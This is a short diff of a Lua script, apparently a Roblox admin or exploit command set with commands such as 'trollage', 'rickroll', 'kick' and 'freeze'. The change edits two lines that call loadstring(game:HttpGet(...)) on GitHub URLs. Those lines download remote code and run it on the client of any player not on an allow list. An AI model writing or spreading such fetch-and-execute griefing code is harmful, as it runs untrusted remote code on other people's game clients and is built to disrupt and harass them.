@@ -91,7 +91,7 @@ local commands = {
     end,
     trollage = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
         end
     end,
     kick = function()
@@ -111,7 +111,7 @@ local commands = {
     end,
     rickroll = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
         end
     end,
     freeze = function()
